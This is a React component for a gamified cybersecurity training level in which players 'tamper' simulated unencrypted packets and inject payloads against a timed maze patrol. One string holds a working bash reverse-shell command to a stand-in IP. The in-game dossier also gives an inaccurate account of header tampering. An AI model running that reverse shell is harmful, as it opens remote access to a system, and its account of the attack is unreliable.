import React, { useState, useEffect, useRef } from 'react';
import { MissionData } from '../../../types/cyberlab';
import { 
  Zap, 
  CheckCircle2, 
  Radio, 
  Flame, 
  AlertTriangle, 
  HelpCircle, 
  Activity,
  Edit3,
  Lock,
  Unlock,
  Crosshair,
  ShieldAlert,
  Compass,
  ArrowRight,
  Sparkles
} from 'lucide-react';
import { sound } from '../../../utils/audio';

interface PacketInjectionLabProps {
  mission: MissionData;
  onSuccess: () => void;
}

interface StreamPacket {
  id: string;
  timestamp: string;
  sourceIp: string;
  destIp: string;
  rawProtocol: string;
  port: number;
  hasSslCert: boolean;
  sslCertStatus: 'NO_CERT' | 'VALID_TLS_CERT';
  sslCertLabel: string;
  uriOrHost: string;
  payloadSummary: string;
  isInjected: boolean;
  isVulnerable: boolean;
  tamperedProtocol?: string;
  exploitPayload?: string;
}

const MAZE_DURATION_SECONDS = 22.0;
const REQUIRED_COUNT = 3;

// Precise waypoints along a visual cyber maze (scaled to 100x60 viewBox)
const MAZE_WAYPOINTS = [
  { x: 6, y: 10 },    // 0: Start Node
  { x: 30, y: 10 },   // 1
  { x: 30, y: 28 },   // 2
  { x: 14, y: 28 },   // 3
  { x: 14, y: 48 },   // 4
  { x: 48, y: 48 },   // 5
  { x: 48, y: 22 },   // 6
  { x: 68, y: 22 },   // 7
  { x: 68, y: 48 },   // 8
  { x: 86, y: 48 },   // 9
  { x: 86, y: 18 },   // 10
  { x: 94, y: 18 }    // 11: Exit / Alarm Node
];

// Helper to compute position along waypoints given 0..1 progress
function getMazeCoordinates(progress: number): { x: number; y: number; segmentIndex: number } {
  const totalSegments = MAZE_WAYPOINTS.length - 1;
  const scaled = Math.max(0, Math.min(0.999, progress)) * totalSegments;
  const segIndex = Math.floor(scaled);
  const segProgress = scaled - segIndex;
  
  const p1 = MAZE_WAYPOINTS[segIndex];
  const p2 = MAZE_WAYPOINTS[segIndex + 1] || p1;
  
  return {
    x: p1.x + (p2.x - p1.x) * segProgress,
    y: p1.y + (p2.y - p1.y) * segProgress,
    segmentIndex: segIndex
  };
}

export const PacketInjectionLab: React.FC<PacketInjectionLabProps> = ({
  mission,
  onSuccess
}) => {
  const [injectedCount, setInjectedCount] = useState(0);
  const [mazeProgress, setMazeProgress] = useState(0); // 0.0 to 1.0
  const [isCompleted, setIsCompleted] = useState(false);
  const [showIntelManual, setShowIntelManual] = useState(false);
  const [errorNotice, setErrorNotice] = useState<string | null>(null);
  const [successNotice, setSuccessNotice] = useState<string | null>(null);
  
  // Selected packet for inline header tampering
  const [selectedPacketId, setSelectedPacketId] = useState<string | null>('pkt-101');
  const [editedProtocol, setEditedProtocol] = useState<string>('RAW_SOCKET');
  const [guardAlertTriggered, setGuardAlertTriggered] = useState(false);

  const initialPackets: StreamPacket[] = [
    {
      id: 'pkt-101',
      timestamp: '00:01.240',
      sourceIp: '192.168.1.45',
      destIp: '192.168.1.100',
      rawProtocol: 'RAW_SOCKET',
      port: 80,
      hasSslCert: false,
      sslCertStatus: 'NO_CERT',
      sslCertLabel: 'SSL: NONE (NO_CERT)',
      uriOrHost: 'GET /api/v1/auth/session',
      payloadSummary: 'Authorization: Bearer session_token_cleartext=8831',
      isInjected: false,
      isVulnerable: true
    },
    {
      id: 'pkt-102',
      timestamp: '00:02.110',
      sourceIp: '192.168.1.88',
      destIp: '192.168.1.100',
      rawProtocol: 'TLSv1.3',
      port: 443,
      hasSslCert: true,
      sslCertStatus: 'VALID_TLS_CERT',
      sslCertLabel: 'SSL: VALID (RSA-4096 / SHA-256)',
      uriOrHost: 'core-vault.omega.corp',
      payloadSummary: 'Application Data [256-bit AES-GCM Encrypted Frame]',
      isInjected: false,
      isVulnerable: false
    },
    {
      id: 'pkt-103',
      timestamp: '00:03.490',
      sourceIp: '192.168.1.12',
      destIp: '192.168.1.100',
      rawProtocol: 'RAW_TCP',
      port: 80,
      hasSslCert: false,
      sslCertStatus: 'NO_CERT',
      sslCertLabel: 'SSL: NONE (NO_CERT)',
      uriOrHost: 'POST /user/checkout/order',
      payloadSummary: 'body={"item_id": 992, "qty": 1, "card_token": "tok_live"}',
      isInjected: false,
      isVulnerable: true
    },
    {
      id: 'pkt-104',
      timestamp: '00:04.810',
      sourceIp: '192.168.1.100',
      destIp: '192.168.1.1',
      rawProtocol: 'DNS',
      port: 53,
      hasSslCert: false,
      sslCertStatus: 'NO_CERT',
      sslCertLabel: 'SSL: NONE (UDP_DATAGRAM)',
      uriOrHost: 'Query: srv-metrics.internal',
      payloadSummary: 'Standard DNS resolution query (UDP port 53)',
      isInjected: false,
      isVulnerable: false
    },
    {
      id: 'pkt-105',
      timestamp: '00:06.050',
      sourceIp: '192.168.1.99',
      destIp: '192.168.1.100',
      rawProtocol: 'STREAM_UNKNOWN',
      port: 80,
      hasSslCert: false,
      sslCertStatus: 'NO_CERT',
      sslCertLabel: 'SSL: NONE (NO_CERT)',
      uriOrHost: 'POST /admin/telemetry/report',
      payloadSummary: 'log_level=DEBUG&worker_node=primary_backend',
      isInjected: false,
      isVulnerable: true
    },
    {
      id: 'pkt-106',
      timestamp: '00:07.320',
      sourceIp: '192.168.1.100',
      destIp: '10.200.0.1',
      rawProtocol: 'TLSv1.3',
      port: 443,
      hasSslCert: true,
      sslCertStatus: 'VALID_TLS_CERT',
      sslCertLabel: 'SSL: VALID (ECDSA-384)',
      uriOrHost: 'api.cloud-metrics.net',
      payloadSummary: 'TLS Handshake [Elliptic Curve Diffie-Hellman Key Exchange]',
      isInjected: false,
      isVulnerable: false
    }
  ];

  const [packets, setPackets] = useState<StreamPacket[]>(initialPackets);

  // Animated Cyber Maze Transit Loop (Replaces digital timer)
  useEffect(() => {
    if (isCompleted) return;

    const intervalMs = 50;
    const step = intervalMs / (MAZE_DURATION_SECONDS * 1000);

    const mazeInterval = setInterval(() => {
      setMazeProgress(prev => {
        const next = prev + step;
        if (next >= 1.0) {
          handleMazeGuardAlert();
          return 0;
        }
        return next;
      });
    }, intervalMs);

    return () => clearInterval(mazeInterval);
  }, [isCompleted]);

  // Periodic stream packet cycling
  useEffect(() => {
    if (isCompleted) return;
    const interval = setInterval(() => {
      setPackets(prev => {
        const next = [...prev];
        const first = next.shift();
        if (first) {
          next.push({
            ...first,
            id: `pkt-${Date.now()}-${Math.floor(Math.random() * 100)}`,
            isInjected: false
          });
        }
        return next;
      });
    }, 2800);

    return () => clearInterval(interval);
  }, [isCompleted]);

  const handleMazeGuardAlert = () => {
    sound.playAlert();
    setGuardAlertTriggered(true);
    setInjectedCount(0);
    setPackets(initialPackets.map(p => ({ ...p, isInjected: false, id: `pkt-${Date.now()}-${Math.random()}` })));
    setErrorNotice('GUARD ALERT TRIGGERED: Patrol sprite traversed the maze and detected conduit probe! Session reset.');
    setTimeout(() => {
      setGuardAlertTriggered(false);
      setErrorNotice(null);
    }, 2800);
  };

  const handleSelectPacket = (pkt: StreamPacket) => {
    sound.playClick();
    setSelectedPacketId(pkt.id);
    setEditedProtocol(pkt.tamperedProtocol || pkt.rawProtocol);
  };

  const handleExecuteTamperAndInject = () => {
    if (isCompleted || !selectedPacketId) return;

    const targetPacket = packets.find(p => p.id === selectedPacketId);
    if (!targetPacket) return;

    // Check if packet has SSL Certificate
    if (targetPacket.hasSslCert || targetPacket.sslCertStatus === 'VALID_TLS_CERT') {
      sound.playAlert();
      setErrorNotice('TAMPERING FAILED: Frame contains valid SSL/TLS certificate. Cryptographic MAC rejection!');
      setTimeout(() => setErrorNotice(null), 3000);
      return;
    }

    // Check if user changed protocol header to HTTP
    if (editedProtocol !== 'HTTP') {
      sound.playAlert();
      setErrorNotice(`HEADER REJECTED: Target frame protocol is set to "${editedProtocol}". Set Protocol to "HTTP" to weaponize cleartext stream.`);
      setTimeout(() => setErrorNotice(null), 3000);
      return;
    }

    if (!targetPacket.isVulnerable) {
      sound.playAlert();
      setErrorNotice('INJECTION FAILED: Non-HTTP socket endpoint rejected raw payload formatting.');
      setTimeout(() => setErrorNotice(null), 2500);
      return;
    }

    if (targetPacket.isInjected) {
      setErrorNotice('This packet stream frame is already weaponized.');
      setTimeout(() => setErrorNotice(null), 2000);
      return;
    }

    // Successful tampering and payload injection
    sound.playThreatNeutralized();
    const shellPayload = `SHELLCODE: /bin/sh -i >& /dev/tcp/10.13.37.1/4444 0>&1 (TAMPERED_HTTP_OVERRIDE_${Date.now().toString().slice(-4)})`;
    
    setPackets(prev =>
      prev.map(p => (p.id === targetPacket.id ? { 
        ...p, 
        isInjected: true, 
        tamperedProtocol: 'HTTP',
        rawProtocol: 'HTTP',
        exploitPayload: shellPayload 
      } : p))
    );

    const newInjectedCount = injectedCount + 1;
    setInjectedCount(newInjectedCount);
    setSuccessNotice(`PACKET TAMPERED & INJECTED: [${targetPacket.uriOrHost}]`);
    setTimeout(() => setSuccessNotice(null), 2500);

    if (newInjectedCount >= REQUIRED_COUNT) {
      setIsCompleted(true);
      sound.playVictory();
      setTimeout(() => {
        onSuccess();
      }, 1800);
    }
  };

  const activePacket = packets.find(p => p.id === selectedPacketId) || packets[0];
  const spritePos = getMazeCoordinates(mazeProgress);
  const isMazeNearEnd = mazeProgress > 0.75;

  return (
    <div className="w-full max-w-full overflow-x-hidden box-border space-y-6 animate-in fade-in duration-300 text-left">
      {/* 1. Tactical Header */}
      <div className="p-4 sm:p-6 rounded-2xl bg-black/90 border border-red-500/40 shadow-[0_0_30px_rgba(255,0,85,0.2)] backdrop-blur-md relative overflow-hidden">
        <div className="absolute top-0 right-0 w-32 h-32 bg-red-500/10 blur-3xl pointer-events-none" />
        
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div className="space-y-1.5 min-w-0">
            <div className="flex flex-wrap items-center gap-2">
              <span className="text-[10px] sm:text-[11px] font-mono font-bold uppercase tracking-wider px-2.5 py-0.5 rounded border bg-red-950/80 border-red-500/50 text-[#FF0055] whitespace-nowrap">
                RED PILL // LEVEL 04
              </span>
              <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded uppercase border bg-amber-950/60 text-amber-400 border-amber-500/30 whitespace-nowrap">
                INTERMEDIATE
              </span>
              <span className="text-xs font-mono text-slate-400 flex items-center gap-1">
                <Radio className="w-3.5 h-3.5 text-red-500 animate-pulse shrink-0" />
                <span className="truncate">Cyber Maze Surveillance Bypass</span>
              </span>
            </div>
            
            <h2 className="text-xl sm:text-2xl font-heading font-black text-white uppercase tracking-wide flex items-center gap-2">
              <Flame className="w-6 h-6 text-[#FF0055] shrink-0" />
              <span>STEALTH PACKET TAMPERING & MAZE RUNNER</span>
            </h2>
            <p className="text-xs sm:text-sm text-slate-300 font-sans max-w-2xl">
              Inspect flowing packet frames to detect unencrypted streams lacking SSL certificates. Manually tamper the protocol field to <code className="text-[#FF0055] font-mono">HTTP</code> and inject 3 payloads before the cyber patrol drone reaches the maze exit node.
            </p>
          </div>

          <div className="flex items-center gap-3 shrink-0">
            <button
              type="button"
              onClick={() => setShowIntelManual(true)}
              className="min-h-[42px] px-3.5 py-2 rounded-xl bg-black/80 border border-red-500/30 text-red-300 hover:text-white hover:border-[#FF0055] hover:shadow-[0_0_15px_rgba(255,0,85,0.3)] transition-all font-mono text-xs font-bold uppercase flex items-center gap-1.5 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-red-500 whitespace-nowrap"
            >
              <HelpCircle className="w-4 h-4 text-[#FF0055] shrink-0" />
              <span>Intel Dossier</span>
            </button>
          </div>
        </div>
      </div>

      {/* 2. Notifications & Alerts */}
      {errorNotice && (
        <div className="p-3.5 rounded-xl bg-red-950/90 border border-red-500 text-red-200 text-xs font-mono flex items-center gap-2.5 animate-in slide-in-from-top-2 shadow-[0_0_20px_rgba(255,0,85,0.4)]">
          <AlertTriangle className="w-4 h-4 text-[#FF0055] shrink-0" />
          <span className="break-all">{errorNotice}</span>
        </div>
      )}

      {successNotice && (
        <div className="p-3.5 rounded-xl bg-green-950/90 border border-green-500 text-green-200 text-xs font-mono flex items-center gap-2.5 animate-in slide-in-from-top-2 shadow-[0_0_20px_rgba(0,255,102,0.4)]">
          <CheckCircle2 className="w-4 h-4 text-green-400 shrink-0" />
          <span className="break-all">{successNotice}</span>
        </div>
      )}

      {/* 3. Visual Cyber Maze Surveillance HUD (Replaces Numeric Countdown Clock) */}
      <div className={`p-4 sm:p-5 rounded-2xl bg-black/90 border transition-all duration-300 relative overflow-hidden ${
        guardAlertTriggered
          ? 'border-red-500 bg-red-950/40 shadow-[0_0_40px_rgba(255,0,85,0.6)]'
          : isMazeNearEnd
          ? 'border-red-500 shadow-[0_0_30px_rgba(255,0,85,0.35)]'
          : 'border-red-500/40 shadow-[0_0_20px_rgba(255,0,85,0.15)]'
      }`}>
        <div className="flex flex-wrap items-center justify-between gap-2 pb-3 border-b border-slate-800">
          <div className="flex items-center gap-2">
            <Compass className={`w-4 h-4 ${isMazeNearEnd ? 'text-[#FF0055] animate-spin' : 'text-red-400'}`} />
            <span className="text-xs font-mono font-bold uppercase tracking-wider text-slate-200">
              CYBER MAZE PATROL HUD // VISUAL CONDUIT ESCAPE
            </span>
          </div>

          <div className="flex items-center gap-3">
            <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded border uppercase ${
              isCompleted
                ? 'bg-green-950 border-green-500 text-green-300'
                : isMazeNearEnd
                ? 'bg-red-950 border-red-500 text-red-300 animate-pulse'
                : 'bg-slate-900 border-slate-700 text-slate-300'
            }`}>
              {isCompleted ? 'CONDUIT COMPROMISED' : isMazeNearEnd ? 'PATROL PROXIMITY ALERT' : 'PATROL IN TRANSIT'}
            </span>

            <span className="text-xs font-mono font-bold text-[#FF0055]">
              INJECTED: [{injectedCount} / 3]
            </span>
          </div>
        </div>

        {/* Vector SVG Maze Container */}
        <div className="relative w-full max-w-full my-3 bg-slate-950/90 rounded-xl border border-red-950/60 p-2 sm:p-3 overflow-hidden">
          <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,rgba(255,0,85,0.08),transparent_70%)] pointer-events-none" />
          
          <svg 
            viewBox="0 0 100 60" 
            className="w-full h-28 sm:h-36 object-contain overflow-visible"
            preserveAspectRatio="xMidYMid meet"
          >
            {/* Grid Backdrop Lines */}
            <defs>
              <pattern id="maze-grid" width="10" height="10" patternUnits="userSpaceOnUse">
                <path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,0,85,0.06)" strokeWidth="0.5" />
              </pattern>
              <linearGradient id="mazeTrackGrad" x1="0%" y1="0%" x2="100%" y2="0%">
                <stop offset="0%" stopColor="#334155" />
                <stop offset="70%" stopColor="#dc2626" />
                <stop offset="100%" stopColor="#FF0055" />
              </linearGradient>
            </defs>
            <rect width="100" height="60" fill="url(#maze-grid)" />

            {/* Maze Walls / Corridor Obstacles */}
            <path
              d="M 2 2 L 98 2 L 98 58 L 2 58 Z M 20 2 L 20 38 M 40 58 L 40 18 M 60 2 L 60 38 M 78 58 L 78 10"
              fill="none"
              stroke="rgba(255,255,255,0.08)"
              strokeWidth="1.2"
              strokeLinecap="round"
            />

            {/* Active Conduit Transit Pathway */}
            <path
              d="M 6 10 L 30 10 L 30 28 L 14 28 L 14 48 L 48 48 L 48 22 L 68 22 L 68 48 L 86 48 L 86 18 L 94 18"
              fill="none"
              stroke="url(#mazeTrackGrad)"
              strokeWidth="2.4"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="drop-shadow-[0_0_6px_rgba(255,0,85,0.4)]"
            />

            {/* Start Node: Conduit Entry */}
            <g transform="translate(6, 10)">
              <circle r="3.5" fill="#000" stroke="#FF0055" strokeWidth="1.2" />
              <circle r="1.5" fill="#FF0055" />
              <text x="0" y="-5" fill="#f87171" fontSize="3" fontFamily="monospace" textAnchor="middle" fontWeight="bold">
                BREACH
              </text>
            </g>

            {/* Exit Node: Guard Patrol Sensor */}
            <g transform="translate(94, 18)">
              <circle r="4" fill="#000" stroke={isMazeNearEnd ? "#FF0055" : "#f59e0b"} strokeWidth="1.4" className={isMazeNearEnd ? "animate-ping" : ""} />
              <circle r="2.2" fill={isMazeNearEnd ? "#FF0055" : "#f59e0b"} />
              <text x="0" y="-5.5" fill={isMazeNearEnd ? "#FF0055" : "#fbbf24"} fontSize="3" fontFamily="monospace" textAnchor="middle" fontWeight="bold">
                GUARD EXIT
              </text>
            </g>

            {/* Intermediate Checkpoint Beacons */}
            {[
              { x: 30, y: 10 },
              { x: 14, y: 48 },
              { x: 48, y: 22 },
              { x: 86, y: 48 }
            ].map((pt, i) => (
              <circle key={i} cx={pt.x} cy={pt.y} r="1" fill="#475569" />
            ))}

            {/* The Moving Patrol Drone / Sprite */}
            {!isCompleted && (
              <g transform={`translate(${spritePos.x}, ${spritePos.y})`}>
                <circle r="5" fill="none" stroke="#FF0055" strokeWidth="0.8" opacity="0.6" className="animate-ping" />
                <polygon
                  points="0,-3.5 3,0 0,3.5 -3,0"
                  fill="#ffffff"
                  stroke="#FF0055"
                  strokeWidth="1"
                  className="drop-shadow-[0_0_8px_#FF0055]"
                />
              </g>
            )}
          </svg>

          {/* Maze Status Sub-bar */}
          <div className="flex flex-wrap items-center justify-between text-[11px] font-mono text-slate-400 mt-2 px-1 gap-2">
            <span className="flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-[#FF0055] animate-pulse" />
              <span>Conduit Drone: {Math.round(mazeProgress * 100)}% through maze path</span>
            </span>
            <span className="text-slate-400">
              Tamper & Inject 3 frames before patrol hits exit node
            </span>
          </div>
        </div>
      </div>

      {/* 4. Operational Grid: Packet Stream Feed (Col 7) + Manual Header Tamper Terminal (Col 5) */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 w-full max-w-full items-start">
        
        {/* Left: Live Packet Stream Feed */}
        <div className="lg:col-span-7 w-full max-w-full overflow-x-hidden box-border p-4 sm:p-5 rounded-2xl bg-black/90 border border-slate-800 space-y-4">
          <div className="flex items-center justify-between pb-3 border-b border-slate-800/80">
            <div className="flex items-center gap-2">
              <Activity className="w-4 h-4 text-[#FF0055] animate-pulse shrink-0" />
              <span className="text-xs font-mono font-bold uppercase tracking-wider text-slate-200">
                LIVE CONDUIT PACKET STREAM
              </span>
            </div>
            <span className="text-[11px] font-mono text-slate-400">
              SELECT FRAME TO INSPECT
            </span>
          </div>

          {/* Flowing Packet Stream Cards */}
          <div className="space-y-2.5 max-h-[460px] overflow-y-auto pr-0.5 w-full max-w-full box-border">
            {packets.map((pkt) => {
              const isSelected = selectedPacketId === pkt.id;
              const hasCert = pkt.hasSslCert || pkt.sslCertStatus === 'VALID_TLS_CERT';

              return (
                <div
                  key={pkt.id}
                  onClick={() => handleSelectPacket(pkt)}
                  className={`w-full max-w-full box-border p-3.5 rounded-xl border transition-all duration-200 cursor-pointer text-left relative overflow-hidden select-none active:scale-[0.99] ${
                    isSelected
                      ? 'border-[#FF0055] bg-red-950/40 ring-1 ring-[#FF0055]/50'
                      : pkt.isInjected
                      ? 'bg-red-950/80 border-[#FF0055]'
                      : 'bg-slate-950/80 border-slate-800 hover:border-slate-600 hover:bg-slate-900/70'
                  }`}
                >
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-1.5">
                    {/* Protocol & Routing */}
                    <div className="flex flex-wrap items-center gap-2 font-mono text-xs">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold border uppercase ${
                        pkt.isInjected || pkt.rawProtocol === 'HTTP'
                          ? 'bg-red-900/80 text-white border-red-500'
                          : 'bg-slate-900 text-slate-300 border-slate-700/80'
                      }`}>
                        {pkt.isInjected ? 'HTTP (WEAPONIZED)' : pkt.rawProtocol} :{pkt.port}
                      </span>
                      <span className="text-slate-400 text-[11px] font-mono whitespace-nowrap">
                        {pkt.sourceIp} ➔ {pkt.destIp}
                      </span>
                    </div>

                    {/* Certificate Status Tag */}
                    <div className="flex items-center gap-2">
                      <span className="text-[10px] font-mono text-slate-500">
                        {pkt.timestamp}
                      </span>
                      {pkt.isInjected ? (
                        <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-red-900/90 border border-red-400 text-white flex items-center gap-1 whitespace-nowrap shadow-[0_0_8px_#FF0055]">
                          <Zap className="w-3 h-3 fill-current" />
                          <span>INJECTED</span>
                        </span>
                      ) : (
                        <span className={`text-[10px] font-mono font-semibold px-1.5 py-0.5 rounded flex items-center gap-1 ${
                          hasCert 
                            ? 'bg-slate-900 text-emerald-400 border border-emerald-500/30' 
                            : 'bg-slate-900 text-amber-400 border border-amber-500/30'
                        }`}>
                          {hasCert ? <Lock className="w-3 h-3" /> : <Unlock className="w-3 h-3" />}
                          <span className="text-[9px]">{hasCert ? 'SSL: VALID' : 'SSL: NONE'}</span>
                        </span>
                      )}
                    </div>
                  </div>

                  {/* URI / Host Target */}
                  <div className="font-mono text-xs break-all mt-1">
                    <span className="text-slate-400 mr-1.5 font-sans font-semibold">Endpoint:</span>
                    <span className={pkt.isInjected ? 'text-red-300 font-bold' : 'text-slate-200'}>
                      {pkt.uriOrHost}
                    </span>
                  </div>

                  {/* Certificate & Data Summary */}
                  <div className="flex flex-wrap items-center justify-between text-[11px] font-mono text-slate-400 mt-1 gap-2">
                    <span className="truncate">Payload: {pkt.payloadSummary}</span>
                    <span className={`text-[10px] font-bold ${hasCert ? 'text-emerald-400/80' : 'text-amber-400'}`}>
                      {pkt.sslCertLabel}
                    </span>
                  </div>
                </div>
              );
            })}
          </div>

          <div className="text-[11px] font-mono text-slate-400 text-center border-t border-slate-800/80 pt-2.5">
            ⚡ Locate frames with <span className="text-amber-400 font-bold">SSL: NONE</span>, tamper header to HTTP, and inject payload.
          </div>
        </div>

        {/* Right: Manual Packet Header Tamper & Injection Workbench */}
        <div className="lg:col-span-5 w-full max-w-full space-y-4">
          
          <div className="p-4 sm:p-5 rounded-2xl bg-black/90 border border-red-500/40 space-y-4 font-mono text-xs text-left">
            <div className="flex items-center justify-between pb-2.5 border-b border-slate-800 text-slate-200 font-bold">
              <div className="flex items-center gap-2">
                <Edit3 className="w-4 h-4 text-[#FF0055]" />
                <span>INLINE HEADER TAMPERING CONSOLE</span>
              </div>
              <span className="text-[10px] text-red-400">
                FRAME: {activePacket?.id || 'NONE'}
              </span>
            </div>

            {/* Target Selected Frame Metadata */}
            <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800/80 space-y-2 text-[11px]">
              <div className="flex justify-between">
                <span className="text-slate-400">Source / Dest IP:</span>
                <span className="text-slate-200">{activePacket?.sourceIp} ➔ {activePacket?.destIp}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">Port / Socket:</span>
                <span className="text-slate-200">Port {activePacket?.port}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">SSL Certificate Status:</span>
                <span className={activePacket?.hasSslCert ? 'text-emerald-400 font-bold' : 'text-amber-400 font-bold'}>
                  {activePacket?.hasSslCert ? 'VALID (Encrypted)' : 'NONE (Cleartext Unprotected)'}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">Stream URI:</span>
                <span className="text-slate-300 truncate max-w-[180px]">{activePacket?.uriOrHost}</span>
              </div>
            </div>

            {/* Manual Protocol Field Dropdown / Selection */}
            <div className="space-y-1.5">
              <label className="text-[11px] font-mono text-slate-300 font-bold block">
                Tamper Protocol Header Field:
              </label>
              
              <div className="grid grid-cols-3 gap-2">
                {['HTTP', 'TLSv1.3', 'RAW_SOCKET'].map((proto) => {
                  const isChosen = editedProtocol === proto;
                  return (
                    <button
                      key={proto}
                      type="button"
                      onClick={() => setEditedProtocol(proto)}
                      className={`min-h-[44px] py-2 px-2 rounded-xl border text-xs font-mono font-bold transition-all ${
                        isChosen
                          ? 'bg-red-600 border-[#FF0055] text-white shadow-[0_0_12px_rgba(255,0,85,0.5)]'
                          : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-slate-200 hover:border-slate-700'
                      }`}
                    >
                      {proto}
                    </button>
                  );
                })}
              </div>
              <p className="text-[10px] text-slate-400 font-sans mt-1">
                Setting protocol to <span className="text-[#FF0055] font-mono font-bold">HTTP</span> overrides raw socket stream for exploit delivery.
              </p>
            </div>

            {/* Action Injection Button */}
            <button
              type="button"
              onClick={handleExecuteTamperAndInject}
              disabled={isCompleted || activePacket?.isInjected}
              className={`w-full min-h-[48px] py-3 px-4 rounded-xl font-mono text-xs font-bold uppercase transition-all flex items-center justify-center gap-2 ${
                isCompleted || activePacket?.isInjected
                  ? 'bg-slate-900 border border-slate-800 text-slate-500 cursor-not-allowed'
                  : 'bg-[#FF0055] hover:bg-red-600 text-white shadow-[0_0_20px_rgba(255,0,85,0.4)] active:scale-[0.98]'
              }`}
            >
              <Zap className="w-4 h-4 fill-current" />
              <span>{activePacket?.isInjected ? 'Payload Already Injected' : 'Tamper Protocol & Inject Payload'}</span>
            </button>
          </div>

          {/* Injected Slots Indicator */}
          <div className="p-3.5 rounded-2xl bg-black/90 border border-slate-800 space-y-2 font-mono text-xs">
            <div className="flex items-center justify-between">
              <span className="text-slate-400">Exploit Payloads Injected:</span>
              <span className="font-bold text-[#FF0055]">[{injectedCount} / 3]</span>
            </div>
            <div className="grid grid-cols-3 gap-2">
              {[0, 1, 2].map((idx) => {
                const filled = injectedCount > idx;
                return (
                  <div 
                    key={idx}
                    className={`h-8 rounded-lg border flex items-center justify-center font-mono text-xs font-bold transition-all ${
                      filled 
                        ? 'bg-red-950/90 border-[#FF0055] text-white shadow-[0_0_10px_rgba(255,0,85,0.4)]'
                        : 'bg-slate-900/50 border-slate-800 text-slate-600'
                    }`}
                  >
                    {filled ? '✓ INJECTED' : `SLOT ${idx + 1}`}
                  </div>
                );
              })}
            </div>
          </div>

        </div>
      </div>

      {/* 5. Intel Dossier Modal */}
      {showIntelManual && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="max-w-xl w-full p-6 rounded-2xl bg-black border border-red-500/50 shadow-[0_0_40px_rgba(255,0,85,0.3)] space-y-4 text-left">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <div className="flex items-center gap-2">
                <HelpCircle className="w-5 h-5 text-[#FF0055]" />
                <h3 className="text-lg font-heading font-bold text-white uppercase">
                  AitM Packet Tampering & Maze Protocol
                </h3>
              </div>
              <button
                type="button"
                onClick={() => setShowIntelManual(false)}
                className="min-h-[36px] px-3 py-1 rounded-lg border border-slate-700 text-slate-400 hover:text-white hover:border-slate-500 text-xs font-mono uppercase"
              >
                Close
              </button>
            </div>

            <div className="space-y-3 font-sans text-xs text-slate-300 leading-relaxed">
              <p>
                <strong className="text-white">Protocol Header Tampering:</strong> Attackers inspect stream conduits for unencrypted raw traffic lacking SSL certificates. By rewriting the protocol identifier to standard <code className="text-[#FF0055] font-mono">HTTP</code>, arbitrary reverse shells can be injected into the socket buffer.
              </p>
              <p>
                <strong className="text-amber-400">Cyber Maze Patrol Timing:</strong> The security drone continuously traverses the network maze corridor. If it reaches the exit before 3 unencrypted packets are injected, alarms are tripped and the conduit reset.
              </p>
              <div className="p-3 rounded-lg bg-red-950/40 border border-red-500/40 text-red-200 font-mono text-[11px]">
                <strong>OPERATIONAL OBJECTIVE:</strong> Click unencrypted frames lacking SSL certificates (<span className="text-amber-300">SSL: NONE</span>), tamper the Protocol header to <span className="text-white font-bold">HTTP</span>, and deploy reverse-shell payloads before the patrol reaches the exit.
              </div>
            </div>

            <div className="pt-2 flex justify-end">
              <button
                type="button"
                onClick={() => setShowIntelManual(false)}
                className="min-h-[44px] px-5 py-2 rounded-xl bg-red-600 hover:bg-[#FF0055] text-white font-mono font-bold text-xs uppercase shadow-[0_0_15px_#FF0055]"
              >
                Return to Conduit
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
